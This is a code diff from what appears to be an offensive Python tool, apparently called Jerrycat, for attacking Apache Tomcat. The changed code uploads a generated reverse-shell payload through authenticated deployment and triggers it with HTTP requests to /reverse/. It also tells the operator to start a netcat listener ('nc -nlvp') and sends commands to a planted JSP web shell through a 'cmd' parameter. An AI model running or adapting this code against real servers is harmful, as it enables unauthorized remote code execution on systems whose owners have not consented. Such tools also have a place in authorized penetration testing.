@@ -191,18 +191,21 @@ class AuthenticatedAttack(Tomcat):
                         filename = core.utils.generate_payload(filename=filename, lhost=args.lhost, lport=args.lport)
 
                         # deploy again
-                        deploy(filename=filename, path='reverse', url=self.url, username=self.username,
+                        endpoint = deploy(filename=filename, path='reverse', url=self.url, username=self.username,
                                password=self.password)
 
                         output.message(state="ongoing", description=f"Uploading NEW reverse shell",
                                        url=endpoint)
+
+                        endpoint = '/reverse/'
                         output.message(state="success", description=f"Triggering NEW reverse shell",
                                        url=endpoint)
+                        requests.get(url=f"{self.url}{endpoint}")
                     else:
                         endpoint = '/reverse'
-                        requests.get(url=f"{self.url}{endpoint}")
                         output.message(state="success", description=f"Triggering OLD reverse shell",
                                        url=endpoint, clear_before=True)
+                        requests.get(url=f"{self.url}{endpoint}")
 
                         if response.status_code == 200:
                             output.message(state="exit", description="See you next time!", url="")
@@ -220,9 +223,9 @@ class AuthenticatedAttack(Tomcat):
 
                     # deploy part
 
-                    deploy(filename=filename, path='reverse', url=self.url,username=self.username,password=self.password)
+                    endpoint = deploy(filename=filename, path='reverse', url=self.url,username=self.username,password=self.password)
 
-                    output.message(state="success", description="Uploading revershell", url="")
+                    output.message(state="success", description="Uploading revershell", url=endpoint)
 
                     output.message(state="ongoing", description=f"Run this cmd : nc -nlvp {args.lport}",
                                    url="")
@@ -235,15 +238,15 @@ class AuthenticatedAttack(Tomcat):
                         print("[bold red]Jerrycat[/] > ", end="")
                         is_netcat_ready = input()
 
-                    output.message(state="success", description="Send revershell", url="")
-                    response = requests.get(url=f"{self.url}/reverse/")
+                    endpoint = '/reverse/'
+                    output.message(state="success", description="Send revershell", url=endpoint)
+                    response = requests.get(url=f"{self.url}{endpoint}")
                     if response.status_code == 200:
                         output.message(state="exit", description="See you next time!", url="")
                     else:
                         output.message(state="error", description=f"Oups.. seems we have an error {response.status_code} here", url="")
 
     def execute_webshell_cmd(self, cmd: str):
-        # Send the GET request to the web shell
         response = requests.get(f"{self.url}/web_shell/index.jsp?cmd={cmd}")
 
         pre_content = re.search(r'<pre>(.*?)</pre>', response.text, re.DOTALL)
